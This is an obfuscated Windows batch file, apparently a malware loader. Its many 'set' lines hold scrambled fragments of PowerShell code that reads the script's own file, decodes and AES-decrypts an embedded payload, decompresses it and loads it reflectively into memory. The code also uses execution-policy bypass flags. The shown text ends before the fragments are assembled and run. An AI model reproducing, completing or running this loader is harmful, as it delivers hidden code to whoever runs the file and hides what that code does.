@echo off
set "DEkMyUFkIB=NDpz"
set "XtSTMAmUPf=gMod"
set "IIbYgNMGlr=t Sy"
set "FKSPohYint=ck($"
set "DuMgSMxebJ=Conv"
set "tTIuTLrPTv=E.Su"
set "USnVpqgECM=.Ass"
set "AxSgWTvuZz=oin "
set "UkBPGHbAvy=ect "
set "wIeQJDhBtF=$QND"
set "ZycJUhJVTn=Syst"
set "vUqOvBUenc=:: '"
set "suBrGfBXFU=y]::"
set "vpNHDnGgBZ=..-1"
set "Aqopxcipco=daeR"
set "jigxqlMFZI=em.I"
set "kUkrDNbgyU=null"
set "GppDAHQVfZ=[Env"
set "ivvNqjreZZ=ment"
set "gMvDaxvbJd=vert"
set "xSJJAMddyv=Stre"
set "AGQoPyRWoy=xtE "
set "uzdSSgiALR=$EIF"
set "UuPULgMKOL=pher"
set "ErwAMQrZhb=QNDp"
set "QOJHUqKugp=, $l"
set "tGrovfpvIx=ss -"
set "mjZVzfFClZ=rtS4"
set "mrNZJGMNeM=ode]"
set "fygfgKUCoN=jfhx"
set "wdmZvKavZC=ljfh"
set "UGFNCxrTmQ=Secu"
set "qQrmjPTXuF=ke($"
set "kwAkMSJMCF=3HWs"
set "kGPtItKQsw=bstr"
set "yMUJyUmFBa=ress"
set "kJlZPaSUUK=V = "
set "dtcGNJrKZQ=ing("
set "zATdSYhFWn=6esa"
set "jsiYDticFf=]::N"
set "RbYIGWFddy=ion."
set "isKOUKymVV=ljfh"
set "BWSsYsTLpK=('%*'"
set "YxflPWdSCs=ose("
set "bpnGNpDWpo='[-1"
set "YOVelhVCPe=yste"
set "KmGJMZomvS=ert]"
set "ftqnDkgkyJ=gth)"
set "UCwmafqMAq=Mode"
set "HXTlYLsaKC=-nop"
set "kBNzXKMWZc=n ''"
set "dAtnSPKZHk=sion"
set "LlwQjNvxHz=anct"
set "AYivhZICrW=File"
set "wxCTtfpEMb=oArr"
set "gwctbQPGsw=flec"
set "jzDXulhvPs=;$Na"
set "IBNwrYksYs=($YW"
set "nPGaMvhCaN=jfhx"
set "AsyOppsUce=ring"
set "LmyCAcHuxD=);$Q"
set "MsuvQTVRIY=se()"
set "OoRPyzigUE=FiI."
set "spVANEmkQn=$Lyz"
set "pXGVCJfzZA=form"
set "xiJXqtdRnc=y.Cr"
set "mKQyzGnWfc=, (,"
set "aISqJhHvUP=em.C"
set "jDlGSrEpvr=Invo"
set "bytofVvfmG=y.Pa"
set "BHyrzYBwGc=($YW"
set "rNWveHGABE=7;$Q"
set "eyGNsfrarA=+hAO"
set "tDTSMHWjJi=g = "
set "yeZawEboIL=.Mem"
set "gGUdOSiZMA=$ljf"
set "eKMoJCouFc=.Sec"
set "aZNudxxiwE=Star"
set "FzbcwNlfhk=('%~f0'"
set "CratlgFIUv=.Con"
set "lfqhQNbTZk=rofi"
set "aBqptTlbik=)))"
set "xLDwcmEBpZ=$Trc"
set "zrhxQLIGry=xtE."
set "fAyrlsjMAT=YWxt"
set "bDAnkNYglo=ress"
set "ynwIggNrcT=;$Yq"
set "PQLUZqTzUx=ZYYc"
set "hlrpZKMrSo=();$"
set "kOddrxAPqC=ewLi"
set "EmIBwpdguV= '')"
set "xfwGdDMHXv=Obje"
set "OvOxwVNbhH=yoe "
set "ORGjpWsrsH=EIFi"
set "SYUGWIpYEv=rans"
set "gkRztfiAZb=nage"
set "ScqeblOFcf=1] -"
set "iUfeKvHhVT=Nz ="
set "cpBDGMFEDV=.GZi"
set "lKPhkUyswC=Disp"
set "XkGfvNONwi=Qcqq"
set "ZXnbcBTvGC=comp"
set "TmJtqtxmhy=;$vD"
set "lHTCgduDsj=PKCS"
set "GIAdOgODWJ=-Obj"
set "FVwrlvchUf=h = "
set "ssrwsiuvpJ=embl"
set "zrajYpNTTP=grap"
set "oZjhknCUfp=6] -"
set "ByxJQsEoVq=F'[-"
set "RNgxoBDkYJ=oint"
set "iNOLGMozQl=orF'"
set "qnYlJtaDcQ=$Qcq"
set "qShaHmfLiZ=0O+g"
set "OPvGZejNJo=NDpz"
set "xnsvthgdok=and "
set "XZlXNadLqZ=TllA"
set "geSoybdjmz=-joi"
set "lKUrGAOsKh=iron"
set "LhTlwuBkTx=pDZz"
set "EXASqiuwvF= = N"
set "sYBTmCrijx=m.Re"
set "iyUiiezLcU=.Com"
set "FjXyQNrlpq=d;$Q"
set "tHQcmYHKYw=; };"
set "tDDJMOvKcU=1..-"
set "TeSiKQmUTz=ecry"
set "LOXdMcNKhO=yzaA"
set "MGuLxPXIsA=S46e"
set "RagmxVBDgu=stem"
set "AYZNKnmEnM=Obje"
set "sMMFWussvS=ach "
set "IBHEOqckmH=raph"
set "uIXOUIeHqs=eam("
set "OvQNjysypK=Comp"
set "vqDBIUKyPH=pose"
set "MrgBnIFhch=.Cop"
set "lEMmpXiRsu=;$EI"
set "bDkvxmXTtL=Fina"
set "ECQQBBKtVt=z.Pa"
set "CcVziohaQB='txe"
set "vjDdHVuaso=);$Q"
set "EZrzKnMNTH=BC;$"
set "oIyPpKABUz== [S"
set "tvfRPweEIf='dqR"
set "XvzxhSEyqz= '')"
set "hTcsrmhOdk=$Lyz"
set "AIWCEzKeIS=brea"
set "IkXvMLVyPy=z) {"
set "JLpWwTWPRa= New"
set "RvtsbhGQiH=mory"
set "KeMaYupTuA=nct."
set "vnyPbkxfJu=)($P"
set "ylSmwqjFaB=.Dis"
set "gRXCMwPcBq=join"
set "jzqjMkMXvO=I = "
set "YIGbaVNHeB=]::("
set "liQbeBzWZg=Disp"
set "OiZHQyhwTf=-4] "
set "VqarawksPI=16] "
set "ZnrEahpVns=-joi"
set "BNXMaUJxlE=$vDd"
set "jQbkjtYyYO=tdpx"
set "yxgDFRhBTZ=esMa"
set "aUZIvjAbyM=();$"
set "AhTvKpsTuY=.-16"
set "wxiCzkwoVR=.Dis"
set "vgaTTvTGiO=New-"
set "XqHpQZZjCP=ct S"
set "MYECSGAstZ== $Q"
set "imPRDGNgiw=ptog"
set "pLWgPSCVOm=fore"
set "bdFoAbTsbq='')("
set "wKesDblnMT=pres"
set "hmZUIbSKFB=.Mod"
set "uGmfiJSBMI=e]::"
set "FmwDorGxYo=tion"
set "kzMLaQjMla=yste"
set "RIwDjsdftC=bypa"
set "ynVXthjYPR=esaB"
set "KwESkpcFRZ=x, 0"
set "gJCFOGJRaA= = ["
set "NzPWLpzHNR=e = "
set "ERNYijiLCp=morF"
set "IjSTESLcxr=trea"
set "ppQTLtLTiM=ddin"
set "ZsKvZrkJSb=]::C"
set "VmRTWAlwPE=)($l"
set "owUORrqaJn=tryP"
set "QkHlRzDVUK=Yqyo"
set "iUxxnTGcnn=NDpz"
set "pkBFINzrQZ=tem."
set "dHWdtkfTDO=New-"
set "VcSMhVlWBM=ddin"
set "OTDKteWBWY=.Cre"
set "XlhoVArWpk=-1.."
set "IsudPZRcGk=k; }"
set "rxJqEjdmeH=pStr"
set "LOqckDioKX=.IO."
set "mKkYGVaOXq=hy.A"
set "rzFHvHUhCO=ct S"
set "BsacOjeNhP=)) {"
set "kwJWZmvAKf=);$N"
set "ybQKeXEvrX=esFX"
set "oMRuRzkzpO=O.Me"
set "RAItnddbQY=aA);"
set "hBQoLTuUjO=ptor"
set "WTfImLuItn= = $"
set "xBkVlXVNoE=ypto"
set "AWlDcZuUuq=[Sys"
set "jmYfvmYXZA=3); "
set "CveXXdAImv= if "
set "RbIxQARObV=x = "
set "gHsTmRyPYP= = $"
set "dsZiZKrMqx=Syst"
set "ivhXcwDSXi=lit("
set "ABeVgxXZZP=gnir"
set "MxuAqriGnB===')"
set "PBkjvxdImT='[-1"
set "UTrQaTpOja=qh.D"
set "WqysmxAEXr=);$L"
set "lZVadCSqQr=lBlo"
set "KovYbenYVH=Fo7l"
set "fEdPdepRTb=by.T"
set "ULolBpmgvE=hx);"
set "QzODjedKgj=m.IO"
set "tswfXcXgdS=urit"
set "LxUaPusNJY=[IO."
set "IkYRSjQnRd=stem"
set "pXdqitboKM=ose("
set "CDJMGlawRI=rity"
set "kyRMZknGgl=th('"
set "SBftHNYzPQ=TrcN"
set "cxdaffoWVn= [Sy"
set "hqNRyZYKsF=onve"
set "poOUTdWXEa='gni"
set "npmtpaLFVN=tsWi"
set "fpToydESSJ=tS46"
set "qxQAfGaSMC=[]] "
set "JudXvZqiXH=pz.I"
set "QCHyCBRWYv=le  "
set "FAKMsKAbpf=rity"
set "ZmgyZiSFmv=stem"
set "hDomZUDKNc==');"
set "ZnXltNEhKa=nirt"
set "ZPStapOyiJ=ljfh"
set "EwOrziaUNm=yste"
set "AKjgtcpMyQ=isfL"
set "UiFIIGWJHY=m.IO"
set "USqCHjapkd=join"
set "uMRRWuxzbn=$ljf"
set "YmbhiQSVpv=hx ="
set "vmBvgGZGEF=ionM"
set "UwBNknHHRv=am;$"
set "DcjDacffvA=('l0"
set "fwRZXUqyaF=ptog"
set "XgPXfclwDg=NDpz"
set "nqWyubqILU=7Yiv"
set "WUkVDnigdL=('da"
set "HSaybTNzQi= [st"
set "FQlbdPukuh=yTo("
set "qYqOQJjrvV=oryS"
set "SILPZYxIna=..-1"
set "FuxvHbJXdT=Secu"
set "JkeGdnUakf=oL'["
set "MKYsibLtgk=.Cry"
set "LYejGjPVpY=ew-O"
set "cHdNPVHgBK=ateD"
set "AQeSqeiRNa=ispo"
set "VtvSabevOn=736u"
